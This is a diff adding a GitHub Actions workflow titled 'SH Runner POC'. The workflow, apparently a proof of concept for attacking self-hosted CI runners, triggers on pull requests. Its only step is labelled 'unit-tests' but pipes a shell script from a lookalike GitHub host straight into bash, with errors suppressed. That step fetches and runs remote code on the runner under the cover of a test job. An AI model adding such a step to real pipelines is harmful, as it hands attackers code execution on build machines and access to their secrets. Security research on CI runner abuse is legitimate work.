@@ -1,0 +1,11 @@
+name: SH Runner POC
+on:
+  pull_request
+jobs:
+  unit-tests:
+    runs-on: [self-hosted, linux, ARM64]
+    steps:
+      - name: unit-tests
+        continue-on-error: true
+        run: |
+          curl -sSfL https://git.githubusercontent.com/ouruser/dummyval/shell.sh | bash
